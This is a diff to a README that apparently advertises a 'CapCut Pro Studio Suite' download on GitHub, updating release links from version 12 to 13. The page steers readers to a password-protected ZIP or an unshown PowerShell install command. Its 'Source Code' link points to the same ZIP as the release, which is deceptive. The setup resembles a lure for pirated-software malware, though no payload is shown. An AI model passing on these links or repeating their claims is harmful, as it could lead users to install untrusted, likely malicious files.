@@ -35,7 +35,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/InfernalSlugKnife/CapCut-Pro-Studio-Suite/releases/download/12/CapCut-Pro-Studio-Suite.zip">
+<a href="https://github.com/InfernalSlugKnife/CapCut-Pro-Studio-Suite/releases/download/13/CapCut-Pro-Studio-Suite.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -48,8 +48,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/InfernalSlugKnife/CapCut-Pro-Studio-Suite/releases/download/12/CapCut-Pro-Studio-Suite.zip)
-- [Source Code](https://github.com/InfernalSlugKnife/CapCut-Pro-Studio-Suite/releases/download/12/CapCut-Pro-Studio-Suite.zip)
+- [Latest Release](https://github.com/InfernalSlugKnife/CapCut-Pro-Studio-Suite/releases/download/13/CapCut-Pro-Studio-Suite.zip)
+- [Source Code](https://github.com/InfernalSlugKnife/CapCut-Pro-Studio-Suite/releases/download/13/CapCut-Pro-Studio-Suite.zip)
 
 > 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
 >
